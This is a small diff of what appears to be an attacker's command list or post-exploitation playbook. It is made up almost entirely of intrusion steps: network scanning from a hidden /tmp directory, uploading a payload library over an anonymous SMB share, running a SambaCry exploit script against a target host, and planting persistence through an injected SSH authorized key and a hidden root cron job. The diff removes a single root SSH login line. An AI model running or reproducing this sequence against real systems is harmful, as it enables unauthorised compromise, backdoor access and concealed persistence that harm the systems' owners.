@@ -36,7 +36,6 @@ ss -tlnp
 /tmp/.tools/nmap -sV 10.0.2.1
 smbclient //10.0.4.6/public -N -c "put /tmp/.tools/libpayload.so libpayload.so"
 python3 /tmp/.tools/exploit_sambacry.py 10.0.4.6 /srv/public/libpayload.so
-ssh -o StrictHostKeyChecking=no root@10.0.4.6 id
 ssh-keygen -t rsa -N "" -f /root/.ssh/id_rsa
 cat /root/.ssh/id_rsa.pub >> /home/admin/.ssh/authorized_keys
 echo "*/5 * * * * root /tmp/.update >/dev/null 2>&1" > /etc/cron.d/.persistence
